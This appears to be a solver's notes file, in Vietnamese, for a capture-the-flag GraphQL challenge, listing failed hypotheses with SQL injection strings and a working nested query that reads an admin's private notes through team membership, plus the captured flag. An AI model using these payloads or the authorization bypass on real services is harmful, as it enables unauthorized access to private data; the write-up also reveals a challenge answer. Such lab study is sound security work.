# notes.md - shape-of-query

Đầu vào: portal GraphQL tại `https://shape-of-query.pointeroverflowctf.com`, đăng nhập bằng session token của team (trang challenge sinh token mới mỗi lần reload, hạn 15 phút).

## Những gì đã xác minh được

| Mục | Giá trị |
|---|---|
| Đăng nhập | `POST /session/exchange {"token": ...}` -> `{"ok":true,"team_id":612}`, set cookie `session` (Python urllib nhận được, không bị chặn đọc) |
| API | `POST /graphql`, GraphiQL ở `/graphql`, introspection bật |
| Schema | `Query{me, user(id:ID!)}`, `User{id, username, role, team, privateNotes}`, `Team{id, name, members:[User]}`, `enum UserRoleEnum{ADMIN, MEMBER}` |
| Tài khoản của mình | `user_612` / `researcher_612`, role `MEMBER`, `privateNotes` = "Grocery list..." (mồi) |
| Thành viên team | `user_612` (MEMBER) và `admin_612` (ADMIN) - mỗi team có một admin riêng |

## Vòng giả thuyết

| # | Giả thuyết | Lệnh kiểm tra | Kết quả |
|---|---|---|---|
| H1 | IDOR trên `user(id:)`, đọc team khác | `user(id:"user_1")`, `user(id:"612")`, `user(id:"1")` | **DEAD**: tất cả trả `null`, không lỗi |
| H2 | SQLi ngay trong tham số `id` (tên bài gợi "query") | `id:"user_1' OR '1'='1"`, `id:"user_612' OR '1'='1"`, `id:"user_612'--"`, `id:"user_612 "` | **DEAD**: mọi payload trả `null` chứ không đổi hình dạng kết quả; resolver dùng truy vấn tham số hoá |
| H3 | Có field ẩn ở gốc `Query` (introspection lọc bớt) | 46 tên đoán sẵn (`flag secret admin users notes debug version token session sql exec ping ...`) gửi `{ <tên> }` | **DEAD**: cả 46 đều `Cannot query field`. `Query` đúng chỉ có `me` và `user` |
| H4 | Alias confusion / thứ tự field làm hỏng resolver | `{ one: user(id:"user_1"){...} six: user(id:"user_612"){...} }` và đảo ngược thứ tự | **DEAD**: mỗi field được định giá độc lập, `one` vẫn `null` ở cả hai shape |
| H5 | Query batching (mảng request) bỏ qua quyền | `POST /graphql` với body `[{query:"{user(id:\"user_1\"){...}}"}, ...]` | **DEAD**: server trả **HTTP 500** (HTML Flask), không trả dữ liệu. Ghi nhận là lỗi implementation, không khai thác |
| H6 | Kiểm tra quyền gắn ở **đường query**, không gắn ở **field** | `{ me { team { members { id username role privateNotes } } } }` | **OK**: `privateNotes` trả thô cho mọi thành viên, trong đó `admin_612` chứa cờ |

## Bằng chứng quyết định

```json
{"data":{"me":{"team":{"members":[
  {"id":"user_612","privateNotes":"Grocery list, personal reminders. Nothing worth reading.","role":"MEMBER","username":"researcher_612"},
  {"id":"admin_612","privateNotes":"POCTF{81.612.EB7ZOZUZT7FJHWR2.YQXWHGRFYSBYU46VGKVYD22DNN}","role":"ADMIN","username":"admin_612"}
]}}}}
```

- `user(id:"admin_612")` vẫn trả `null` dù admin đó **cùng team** với mình -> bộ kiểm tra quyền nằm ở resolver của `Query.user` (so khớp id của người gọi), còn `Team.members` không hề gọi lại phép kiểm tra đó khi chọn field.
- Nonce trong cờ (`EB7ZOZUZT7FJHWR2`) trùng nonce trong session token của chính trang challenge -> đúng là cờ của team đó, không phải dữ liệu team khác.

## Root cause (ghi lại để dùng về sau)

Với GraphQL, "shape of query" nghĩa là: quyền có thể được cài ở **resolver của một field gốc** (`Query.user`) và hoàn toàn vắng mặt trên **đường lồng** (`Query.me -> Team -> [User] -> privateNotes`). Vì vậy khi gặp mô hình "chỉ được xem chính user", hãy liệt kê mọi đường đi tới cùng một field trong schema (đồ thị type graph) rồi thử từng đường, thay vì chỉ thử đúng endpoint mà mô tả field gợi ý. Kiểm tra theo field (graph-level) đáng tin hơn kiểm tra theo route.

Chi tiết gây nhiễu: đề đánh lạc hướng bằng "researchers meddling with each others' stuff" (gợi cross-team IDOR), nhưng cờ thật nằm ở tài khoản admin **của chính team đó**; cross-team vẫn bị chặn.

## Nộp flag

```
POST /challenges/shape-of-query/submit
{"flag":"POCTF{81.612.EB7ZOZUZT7FJHWR2.YQXWHGRFYSBYU46VGKVYD22DNN}"}
{"correct":true,"message":"Correct."}
```
